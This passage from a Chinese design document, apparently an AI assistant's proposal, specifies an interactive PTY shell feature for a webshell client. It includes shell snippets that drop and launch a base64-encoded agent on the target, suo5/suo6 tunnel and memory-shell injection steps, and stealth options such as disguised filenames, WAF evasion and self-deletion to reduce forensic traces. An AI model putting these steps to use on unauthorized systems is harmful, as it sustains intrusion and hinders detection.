    i=$((i + 1)); sleep 0.01
  done
fi

# ③ 输出（头部 + base64）
GEN=$(cat "$D/gen" 2>/dev/null);    GEN=${GEN:-0}
BASE=$(cat "$D/base" 2>/dev/null);  BASE=${BASE:-0}
DROP=$(cat "$D/dropped" 2>/dev/null); DROP=${DROP:-0}
INK=$(wc -c < "$D/ink" 2>/dev/null || echo 0)
[ "$OFF" -lt "$BASE" ] && OFF="$BASE"
printf '%s %s %s %s;' "$GEN" "$BASE" "$DROP" "$INK"
tail -c +$((OFF - BASE + 1)) "$D/out" 2>/dev/null |
  head -c "$LIM" | base64 | tr -d '\r\n'
echo "$OFF" > "$D/ack"
touch "$D/ka" 2>/dev/null            # 客户端活跃标记（Agent 据此判遗弃，§3.9.6）
```

响应格式：`<gen> <base> <dropped> <inkBytes>;<base64 数据>`

**为什么合并**：拆成 `send` + `read` 两个请求要 2 个 RTT；合并后按键回显 ≈ 1 RTT + ≤50 ms。第 ② 步的等待是必要的——PTY 的 echo 由 line discipline 异步产生，立刻读往往读不到。等待用「out 增长即 break」而不是死等 50 ms，活跃时通常 1–5 ms 就返回。

`inkBytes` 是写对账的依据（§4.1.6），正常路径下不额外发请求。

其余控制类命令（探测/引导/resize/停止）走 §3 的一次性命令，不参与主循环。

#### 4.1.3 主循环与调度

```
gen0 = 0; offset = 0; queue = <输入队列>
loop:
  req  = build(offset, queue.pending())        # 输入捎带
  rsp  = POST(req)                             # 超时 8 s，最多重试 3 次
  on rsp.error:  backoff(); continue
  (gen, base, drop, ink, bytes) = parse(rsp)
  if gen != gen0: gen0 = gen; offset = base; warn("output recycled")
  if bytes.isNotEmpty: offset += bytes.length; feed(bytes); markHot()
  if sentInput: queue.clear(); reconcile(ink)
  if bytes.length == LIM: continue             # drain：还有积压，立刻续拉
  sleep(nextInterval())
```

调度间隔：

| 情况 | 间隔 | 说明 |
| --- | --- | --- |
| drain（`len == LIM`） | 0 ms | 有积压，连续拉取 |
| hot（最近 2 s 有输出） | 60 ms | 打字/命令执行中 |
| warm（最近 30 s 有输出） | 150 ms | 刚操作过 |
| idle | 300 ms → 1 s → 2 s | 指数退避，封顶 2 s |
| 页面不可见 | 2 s | 保会话、降开销 |
| `429` / `503` | 退避 ×2 + 抖动 | 尊重限流，不降档位 |

请求量：hot ≈ 16.7/s、warm ≈ 6.7/s、idle 0.5/s。10 分钟活跃会话约 3k–8k 次请求；纯挂机 1 小时约 1.8k 次。

#### 4.1.4 输入路径

- **合批**：xterm 的 `onOutput` 逐键触发，客户端按「30 ms 窗口或 4 KB 先到先发」合批，避免一字符一请求。Ctrl-C（`0x03`）不插队，30 ms 无感。
- **串行**：同时只允许一个携带输入的请求在途；输入队列 FIFO，不并发写 `ink`（避免多写者交错）。
- **恰好一次**：请求超时后**不盲目重发**（可能已落盘）。用 `inkBytes` 对账：若下一次响应的 `ink` 等于「上次已知 + 本次 payload 长度」，说明已写入；否则补发。单写者前提下，字节数即可精确判定，不需要额外 id 协议。
- **不本地回显**：回显由目标 PTY 产生，本地再回显会双字。

#### 4.1.5 输出路径

- 偏移是**逻辑流偏移**，与文件无关；`base` 表示 `out[0]` 对应的逻辑位置。
- 单块上限 256 KB（base64 后约 341 KB）；`len == LIM` 表示还有积压。
- 大输出（`cat bigfile`、`seq`）走 drain，无间隔连续拉取。吞吐 ≈ 256 KB / (RTT + 服务端 ~20 ms)：LAN 约 10 MB/s，80 ms RTT 约 2.5 MB/s（解码后），足够跑 `tar | base64 -d` 之类的搬运动作。
- 背压：目标端 `out > 8 MB` 时 Agent 停读 master（内核 pty 缓冲填满 → 子进程写阻塞）；客户端侧 `TerminalOutputPipe` 高水位暂停 feed。
- 重放：attach 时从 0 读到当前尾（最多 512 KB）重建屏幕。

#### 4.1.6 一致性与故障处理

| 场景 | 行为 |
| --- | --- |
| 读请求超时 / 5xx | 用**同一 `offset`** 重试（读幂等），3 次后进入 RECONNECTING |
| 响应 base64 解码失败 | 丢弃该响应，重试同一 `offset`；绝不推进偏移 |
| 写请求超时 | 不重发；用 `inkBytes` 对账，必要时补发 |
| `gen` 变化 | 偏移体系重置：`offset = base`，状态栏提示「早期输出已回收」 |
| `offset < base` | 同上（客户端落后超过回收窗口） |
| Agent 消失（`kill -0` 失败） | 置 LOST，提示「重建会话」；屏幕内容保留在本地历史 |
| 目标重启 / Web 服务重启 | 同 LOST |
| 网络切换 | RECONNECTING，退避 250 ms → 5 s，恢复后从原 `offset` 续传 |
| 429 / 503 | 退避 ×2 + 抖动 |

关键不变式：**读永远可以安全重放**（幂等），**偏移只由成功解码的字节数推进**。这两条保证乱序、重试、丢包都不会串字节。

#### 4.1.7 延迟预算

| 环节 | LAN | WAN（RTT 80 ms） |
| --- | --- | --- |
| 按键合批 | 0–30 ms | 0–30 ms |
| HTTP 往返（捎带输入） | 2–5 ms | 80–120 ms |
| 服务端 `sh` 启动 + 写 `ink` | 5–15 ms | 5–15 ms |
| Agent 轮询粒度 | 0–50 ms | 0–50 ms |
| 等回显（第 ② 步） | ≤50 ms（通常 1–5） | ≤50 ms |
| 渲染 | ≤16 ms | ≤16 ms |
| **首字回显（典型）** | **80–120 ms** | **150–250 ms** |

对照：同 RTT 下 SSH 约 1 个 RTT（LAN 5 ms / WAN 90 ms）。P1 多出来的是「合批 + Agent 轮询粒度 + 等回显」，属于可接受范围；把 Agent 轮询从 50 ms 降到 20 ms 可再省 30 ms（代价是目标端 CPU）。

#### 4.1.8 默认参数

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `pollHot` | 60 ms | 活跃期 |
| `pollWarm` | 150 ms | 近期有输出 |
| `pollIdle` | 300 ms → 2 s | 指数退避 |
| `readLimit` | 256 KB | 单次拉取上限 |
| `inputBatch` | 30 ms / 4 KB | 合批窗口 |
| `echoWait` | 50 ms / 5 次 | 第 ② 步上限 |
| `reqTimeout` | 8 s | 单请求超时 |
| `maxRetries` | 3 | 读重试 |
| `replayCap` | 512 KB | 重放上限 |
| `idleTtl` | 900 s | Agent 自毁 |

#### 4.1.9 边界：什么时候不该用 P1

- **RTT > 300 ms**（跨洲/卫星）：打字明显滞后，优先 P3，其次 P2。
- **高频刷屏**（`top -d 0.1`、`watch`）：能用，但请求数与带宽都上去了，P3 更合适。
- **WAF 对「同 URL 高频 POST」敏感**：先抖动 + 加密连接器；仍被拦则 P2（请求数少两个数量级）。
- **目标 shell 启动极慢**（每次 `sh -c` 要 300 ms，如容器冷启动）：P1 每请求都要付这个成本，P2 把成本摊到 15 s。

### 4.2 P2 Long-Poll Push（HTTP 上的「推」）

读命令改成「先等，再取」：

```sh
D="$1"; OFF="$2"; WAIT="${3:-15}"           # WAIT 秒
i=0; N=$((WAIT * 20))
while [ "$i" -lt "$N" ]; do
  B=$(cat "$D/base" 2>/dev/null); B=${B:-0}
  SZ=$(wc -c < "$D/out" 2>/dev/null || echo 0)
  [ $((B + SZ)) -gt "$OFF" ] && break        # 有数据，立刻返回
  i=$((i + 1)); sleep 0.05
done
# ……随后与 P1 相同的头部 + base64 输出
```

- 语义：一个请求挂在目标端，**有输出就立即返回**；超时返回空，客户端立刻续上。交互延迟 ≈ RTT + 50 ms，请求数从 6.7 req/s 降到 0.07 req/s。
- 输入请求独立通道（短请求），因此打字时不必等长请求返回；长请求同时被「回显」唤醒，天然及时。
- 限制与对策：
  - PHP-FPM `request_terminate_timeout`（常见 30–60 s）→ 默认 `WAIT=15`，可从配置改，连续超时自动降级到 P1。
  - `max_execution_time` 在 Unix 按 **CPU 时间**计，`sleep` 不消耗 CPU，通常不触发；仍以 15 s 保守。
  - PHP `session_start()` 会串行化同 session 请求 → **并发探测**（见下）失败就强制 P1。
  - nginx `proxy_buffering` 只影响流式，不影响「处理完再返回」，无碍。

**并发探测**（bootstrap 后做一次，客户端侧两个并发请求）：

```text
t=0ms    POST A: "sleep 2; echo A"      （长请求）
t=120ms  POST B: "echo B"               （短请求）
判定：B 在 t+800ms 内返回 → 允许并发；B 被拖到 A 之后才返回 → 同 session 串行
```

串行说明存在 PHP `session_start()` 锁、单线程运行时（如 `prefork` + `max_children=1`、部分 IIS 配置）或中间代理排队。此时 P2 的长请求会把输入请求一起堵住，**必须**降级到 P1（每请求短小、可接受排队），或改用 P3。

等待循环里的 `cat`/`wc` 每 50 ms 各 fork 一次（约 40 fork/s）。目标端可接受，但若目标是低配容器，可让 Agent 额外维护一个 `len` 文件，循环只读它把 fork 降到 20/s。

### 4.3 P3 Tunnel Push（真全双工）

复用既有 suo5/suo6：

1. **保证隧道**：JSP + Behinder → `injectSuo6MemShell()`（内存马，不落文件）；否则上传 `suo5.php/jsp/aspx` 到 WebShell 同目录（复用 `_uploadOneClickTunnelPayloadAndCreateProfile` 的逻辑）。
2. **Agent 监听 loopback**：`python3 agent.py $D --listen 127.0.0.1:0 --token <16B>`，端口与 token 写入 `$D/ctl`。
3. **隧道直连**：`Suo5Session` 当前只暴露 SOCKS5。新增 `openTcp(host, port)`：内部起一个临时 `ServerSocket(127.0.0.1:0)` → 自连 → 走既有 SOCKS5 握手 → 返回 `Socket`。约 40 行，复用全部已有帧/加密逻辑。
4. **帧协议**（双向同构，避免 resize 走旁路）：

```
连接建立：magic "MXPT" + u8 ver + 16B token
帧：u8 type | u32 be len | payload
  0x01 DATA（pty 字节）
  0x02 RESIZE（payload = u16 cols + u16 rows）
  0x03 EXIT（payload = i32 code）
```

- 优点：无轮询、无文件、延迟 ≈ RTT；resize/exit 在带内；对 WAF 只有一条「看起来像普通隧道」的长连接。
- 限制：需要能落地/注入 suo payload；PHP 的 suo5 half 模式带宽一般；`disable_functions` 里的 `fsockopen`/`socket_*` 会导致隧道不可用（握手阶段即可判定，自动回退 P1/P2）。
- `suo6` 仅 JSP，`suo5` 覆盖 PHP/ASPX/JSP；Windows 目标仍不提供 PTY，故 P3 实际是 JSP 主场。

### 4.4 档位选择

启动对话框默认「Auto」：

```
if 无 shellExec                → 隐藏按钮
elif 有 suo 且 (JSP 可注入 或 可上传 payload) → 推荐 P3
elif 并发探测通过 → 推荐 P2
else → P1
```

用户可手动锁定档位（复现问题、规避 WAF 时有用）。运行时**单向降级**：P3 失败 → P2；P2 连续超时 → P1；P1 连续失败 → 重连提示。绝不反向升级（避免用户以为在看 P3 实际是 P1）。

### 4.5 背压与流控

| 环节 | 机制 |
| --- | --- |
| 目标端 pty → `out` | `out > 8 MB` 时 Agent 暂停读 master（内核缓冲填满 → 子进程阻塞） |
| 客户端 HTTP → xterm | 复用 `TerminalOutputPipe` 的高/低水位 pause/resume（512 KB / 128 KB） |
| 请求并发 | 读、写各自单飞；同一 session 最多 2 个在途请求 |
| 大输出 | drain 模式连续拉取，每块 256 KB（base64 后 ~341 KB） |

### 4.6 环境限制速查

| 限制 | 影响 | 对策 |
| --- | --- | --- |
| `shell_exec`/`proc_open` 被禁 | 无 `shellExec` 能力 | 按钮隐藏（现有 `capabilities` 已能判断） |
| `open_basedir` | 不影响 sh 的文件操作（Agent 由 sh 启动） | — |
| `/tmp` `noexec` | 不影响（`python3 a.py` 只需解释器可执行） | — |
| `/tmp` 只读或容器 | 无法建会话目录 | 依次尝试 `/dev/shm`、`$HOME/.cache`、webroot、`/var/tmp` |
| SELinux `httpd_t` | 通常允许 `/tmp` 写与执行 bin_t | 失败时提示，不静默降级 |
| 铁壳 WAF | base64 命令特征 | Behinder/Godzilla 连接器整包加密，天然规避；纯 passthru 马可加随机前缀/抖动 |
| `base64 -d` 差异 | macOS/BSD 是 `-D`，busybox 支持 `-d` | 探测时同时试 `-d`/`-D`，选中记住 |
| `base64 -w0` 差异 | BSD 无 `-w0` | 统一用 `base64 | tr -d '\n'` |
| `setsid` 缺失 | 无法脱离会话 | 回退 `nohup ... &`，停止时用 `kill $pid` 而非进程组 |

---

## 5. Dart 侧实现

### 5.1 新增文件

```
lib/pty/
├── pty_capabilities.dart       # probe 结果模型 + 档位推荐
├── pty_bootstrap.dart          # 生成 bootstrap/read/send/resize/stop 命令（纯函数，可单测）
├── pty_agent_assets.dart       # A 档 agent 源码（Dart 字符串常量，b64 内联）
├── pty_session.dart            # 会话状态机、历史环形缓冲、重连、统计
├── pty_session_registry.dart   # 单例：页面关闭后会话仍存活，可重新 attach
└── transports/
    ├── pty_transport.dart      # abstract class
    ├── pull_transport.dart
    ├── long_poll_transport.dart
    └── tunnel_transport.dart

lib/pages/
├── pty_terminal_page.dart      # 由 reverse_shell_terminal_page.dart 泛化
└── pty_launch_dialog.dart      # 档位/Shell/尺寸/TTL 选择 + 探测进度
```

### 5.2 连接器扩展

`ShellConnector` 增加（默认实现保证零破坏）：

```dart
/// 字节安全的命令执行（默认 UTF-8 化 executeCommand；二进制通道的连接器覆盖）
Future<Uint8List> executeCommandBytes(String cmd, {String workingDir = ''}) async =>
    Uint8List.fromList(utf8.encode(await executeCommand(cmd, workingDir: workingDir)));

/// 是否支持把多行脚本作为 sh 脚本执行（php_eval/jsp_runtime/godzilla 均为 true）
bool get supportsScriptExec => supportsShellExec;
```

由于读命令的输出**已经**在目标端 base64，`executeCommand` 的 `.trim()` 与 UTF-8 解码都不会破坏数据，因此 v1 只需默认实现即可跑通；`executeCommandBytes` 是给未来直接二进制通道留的口子。

### 5.3 `PtyTransport` 抽象

```dart
abstract class PtyTransport {
  Stream<List<int>> get output;          // 已解码的 pty 原始字节
  Future<void> write(List<int> bytes);   // 串行队列，内部 base64/分片
  Future<void> resize(int cols, int rows);
  Future<void> close();
  bool get isAlive;
  PtyStats get stats;                    // 延迟、请求数、字节数、当前档位
}
```

`PtySession` 复用现有 `ReverseShellSession` 的历史缓冲设计（512 KB 环形、`historyRaw`、resize 去抖），但**去掉** `send` 直接写 socket 的语义，改为交给 transport。

### 5.4 终端页复用（一个必须改的坑）

现有 `TerminalOutputPipe` 无条件做 **LF → CRLF**（`_fixLineEndings`），因为无 PTY 的反弹 shell 只输出 `\n`。

真 PTY 的 line discipline 已经做了 `ONLCR`，输出本来就是 `\r\n`；再转一次会得到 `\r\r\n`，表现为**每行多一个空行/光标错位**。因此：

```dart
TerminalOutputPipe({required this.terminal, this.fixLineEndings = true, ...})
```

`PtyTerminalPage` 传 `fixLineEndings: false`。这是接入时最容易踩的坑，建议加一条单测。

其余 xterm 侧与 `ReverseShellTerminalPage` 完全一致：OSC 52 剪贴板、右键复制/粘贴、`_matrixXtermTheme`、等宽 CJK 回退、`hardwareKeyboardOnly`。

### 5.5 UI

工具栏在现有按钮旁新增一枚（同 `_toolbarBtn`）：

```
[清屏] [suo 隧道] [▣ Full shell (PTY)] [↗ Full terminal (reverse shell)] [模式切换]
```

- 图标 `Icons.terminal`，色 `AppColors.primary`（与红色系的反向入口区分）。
- 显隐条件：`service.supportsShellExec && !webshell.connectorType.startsWith('asp')`。
- 点击 → `PtyLaunchDialog`：
  1. 顶部一行「探测中…」（1 次请求，< 500 ms）；
  2. 探测结果芯片：`python3 3.11` / `script` / `tmp 可写` / `并发 OK` / `suo6 可用`；
  3. 档位单选（Auto 默认，附推荐标记与预计延迟）；
  4. Shell 选择（`$SHELL` / bash / sh / 自定义）、初始尺寸（120×30）、空闲 TTL；
  5. 主按钮「Open PTY」；若只有 C 档能力，则按钮禁用并说明「目标缺少 python3 / script，无法分配伪终端」。
- 终端页顶栏：`Full shell · <shell 名>` + 档位徽标 + 延迟/字节统计 + 重连 / 停止会话。

### 5.6 会话生命周期与持久化

- `PtySessionRegistry` 持有活跃会话；关闭终端页只是取消订阅，会话继续（再打开可从历史回放并继续）。
- 「停止会话」才真正 `kill` + 清理。
- v1 不落库；v2 可在 `meta` 表存 `{sid, dir, shell, mode}`，实现 App 重启后 attach（Agent 侧 `IDLE` 需大于该场景）。

---

## 6. 安全与痕迹

- 会话目录 `700`、`umask 077`、sid 16 hex 随机；所有远端路径变量用 `"$D"` 加引号，sid 做 `^[a-f0-9]{16}$` 校验后再拼命令（防注入）。
- 命令全部 base64，不拼接用户可控内容到 shell 语法位置。
- 空闲自毁 + 启动时清理 24 h 前残留，减少取证面。
- 可选「隐身」开关：Agent 文件名伪装（`.mcache`）、`python3 -c` 内联启动（不落文件，但 `ps` 可见代码）、请求间隔抖动。
- 明确记录：**该功能会在目标上留下一个持有交互式 shell 的常驻进程**，属于高风险动作，应只对授权目标使用；UI 对话框里给出同等提示。
- 不引入新的出网行为：所有流量仍只发往 WebShell URL。

---

## 7. 测试方案

### 7.1 已完成的原型验证（macOS 本地，python3 3.15）

| 项 | 结果 |
| --- | --- |
| `pty.fork` + 离线输出文件 + 输入队列 + `TIOCSWINSZ` | 通过 |
| `isatty` / `tty` | 真（`/dev/ttys*`） |
| 初始尺寸 120×30，resize → 100×40 后 `stty size` | `40 100`（SIGWINCH 生效） |
| Ctrl-C 打断 `sleep 30`，随后 shell 仍可执行命令 | 通过（`AFTER` 未打印） |
| job control（`sleep 5 & jobs`） | `[1] + running sleep 5` |
| 长轮询「有数据即返回」 | 0.04 s 返回 |

> 该原型证明的是**协议与 Agent 逻辑**；尚未经过 WebShell 连接器（HTTP 层）与 P2/P3。

### 7.2 单元测试

- `pty_bootstrap_test.dart`：命令生成、base64 分片、sid 校验、引号转义、`GEN BASE DROP;` 头解析（含 `DROP>0`、`GEN` 跳变、`OFF<BASE`）。
- `terminal_output_pipe_test.dart`：`fixLineEndings=false` 时 `\r\n` 不被二次转换。
- `pty_capabilities_test.dart`：探测输出 → 档位推荐矩阵。

### 7.3 本地端到端（无需真实目标）

新增 `test/support/local_sh_connector.dart`：`ShellConnector` 的测试替身，`executeCommand` 直接 `Process.run('/bin/sh', ['-c', cmd])`，工作目录指向临时目录。于是 **P1/P2 全链路可在 macOS/Linux 上跑**：

```
start → tty 断言 → echo 断言 → resize → stty size 断言
      → Ctrl-C 断言 → 大输出断言（seq 1 50000 不丢字节）
      → 重连断言（关页面再 attach，历史回放且可继续输入）
```

### 7.4 真实目标（env 门控）

复用 Godzilla e2e 的思路：本机 `php -S` 起一个 `php_eval` 马 → 跑 P1/P2 → 断言 `tty`、`vim --version` 可启动、resize 后 `tput cols` 正确。JSP 目标可选测 P3。

### 7.5 冒烟清单（人工）

`vim` 全屏进出、`top` 刷新、`less` 翻页、`Ctrl-Z` + `fg`、粘贴多行、中文输入、窗口缩放、断网 30 s 后恢复、目标重启 Agent 后重连提示。

---

## 8. 里程碑

| 阶段 | 内容 | 产出 | 估时 |
| --- | --- | --- | --- |
| **M1** | P1 传输 + A 档 Agent + `PtyTerminalPage` + 按钮/对话框骨架 | 可用的真 PTY（Unix） | 2 d |
| **M2** | P2 长轮询 + 并发探测 + 自动降级 | 低延迟、低请求量 | 0.5 d |
| **M3** | resize、流控、重连、历史回放、错误态 | 体验完整 | 1 d |
| **M4** | B 档 `script` 降级 + 目录回退 + 清理 | 覆盖无 python 目标 | 0.5 d |
| **M5** | P3 隧道（`openTcp` + 帧协议） | JSP 低延迟全双工 | 1.5 d |
| **M6** | 隐身选项、会话落库、文档/README | 收尾 | 1 d |

M1–M3 是「能用且好用」的最小闭环（约 3.5 d）。

---

## 9. 风险与降级路径

| 风险 | 概率 | 影响 | 降级 |
| --- | --- | --- | --- |
| 目标无 `python3` 且 `script` 行为异常 | 中 | 无真 PTY | B 档；再不行明确拒绝并建议用现有 integrated terminal |
| PHP-FPM 长请求被杀 | 中 | P2 不稳 | 自动回落 P1（错误分类：超时/502/504） |
| session 锁导致请求串行 | 中 | P2 延迟爆炸 | 并发探测失败即锁 P1 |
| WAF 拦截高频请求 | 低-中 | 会话中断 | 退避 + 抖动；加密连接器优先 |
| 目标重启/进程被杀 | 中 | 会话丢失 | 检测 `kill -0` 失败 → 提示「重建会话」 |
| 磁盘被 `yes` 灌满 | 低 | 目标可用性 | 8 MB 软上限 + 背压 + `dropped` 计数 |
| 遗留 root shell 被滥用 | 低 | 严重 | 空闲 TTL + 退出清理 + 显式提示 |

---

## 10. 待确认

1. **v1 是否只做 Unix？**（现按钮已对 `asp*` 隐藏，Windows 建议明确 out of scope）
2. **默认档位**：Auto（推荐 P3→P2→P1）还是固定 P1（最稳、最可解释）？
3. **会话策略**：关闭终端页默认「保留会话」还是「立即 kill」？（前者贴合 C2 习惯，后者更安全）
4. **是否允许落文件**：`python3 -c` 内联（无文件、`ps` 可见）vs 落 `$D/a`（更稳、可重连）。建议默认落文件 + 可选内联。
5. **M1 是否现在就实现？** 若同意，我按 §5.1 的文件结构先落 P1 + A 档 + 终端页，并用 §7.3 的本地 `LocalShConnector` 做端到端自测。

---

## 附录 A：命令编码示例

| 操作 | 远端命令（`$D` 已确定） |
| --- | --- |
| 建目录 | `umask 077; mkdir -p "$D" && echo OK` |
| 投递 Agent | `echo '<b64>' | base64 -d > "$D/a" && chmod 700 "$D/a" && echo OK` |
| 启动 | `setsid python3 "$D/a" "$D" </dev/null >/dev/null 2>&1 & echo $!` |
| 存活 | `kill -0 "$(cat "$D/pid")" 2>/dev/null && echo alive || echo dead` |
| 读 | §3.4 片段 |
| 写 | §3.3 片段 |
| 尺寸 | §3.5 片段 |
| 停止 | `kill -TERM -"$(cat "$D/pid")" 2>/dev/null; rm -rf "$D"; echo OK` |

## 附录 B：与现有功能的边界

| 功能 | 是否需要出网 | 是否真 PTY | 传输 |
| --- | --- | --- | --- |
| 现有 integrated terminal | 否 | 否（每条命令一次 `sh -c`） | WebShell 请求 |
| 现有 Full terminal（反弹） | **是** | 是（`script`） | 目标 → 操作机 TCP |
| 本方案 P1/P2 | 否 | **是** | WebShell 请求 |
| 本方案 P3 | 否（复用 suo 隧道） | **是** | suo5/suo6 隧道 |

---

## 11. 必要性评估：已经有 C2 时还要不要做

**结论**：如果 C2 能在同一目标上稳定落地并回连，本功能属于「锦上添花」，优先级应低于 C2 相关建设。只有当下面三条之一成立时才值得投入。

| 维度 | 成熟 C2 | 本方案（P1 + L1/L2） |
| --- | --- | --- |
| 终端质量 | 真 PTY、长连接、低延迟 | 真 PTY，但 P1 延迟高一档、请求多 |
| 前置条件 | 需投递 implant，且目标能回连 | **复用已存在的 WebShell**，无新投递、无出网 |
| 执行上下文 | 取决于 implant 落地方式与提权路径 | **与 WebShell 完全同用户 / 容器 / cgroup / SELinux 域** |
| 合规约束 | 多数项目禁止二进制落地 | L1 只落脚本；L0 零落地 |
| 平台统一性 | 独立平台，需切换 | 与现有 WebShell 工作流同屏 |
| 建设成本 | — | M1–M4 约 4 人日 + 长期维护（载体变体、OS 差异、连接器错误串） |

**值得做的三个触发条件**：

1. **C2 起不来但 WebShell 在**：目标只能出 HTTP 到 WebShell（无公网出口、DNS 受限、严格代理、目标在纯内网），此时 implant 无法回连，而 WebShell 通道已被证明可用。
2. **需要「与 WebShell 同上下文」的 shell**：定位「这个站到底以什么用户 / 在哪个容器 / 哪个 SELinux 域运行」、复现漏洞实际影响、给客户演示「通过这个入口能做什么」。
3. **项目禁止投递二进制**：只能用 L1（脚本）或 L0（零落地），C2 implant 直接被合规否掉。

**不成立时**：不做。保留本文档作为方案储备与后续可选能力，不在当前里程碑排期。

**如果未来要做，最小切口**：只做 P1 + L1（约 2 人日），验证「WebShell 上真 PTY」体验是否真的比现有 integrated terminal 有质的提升；体感成立再补 L2 自包含与 P2/P3。
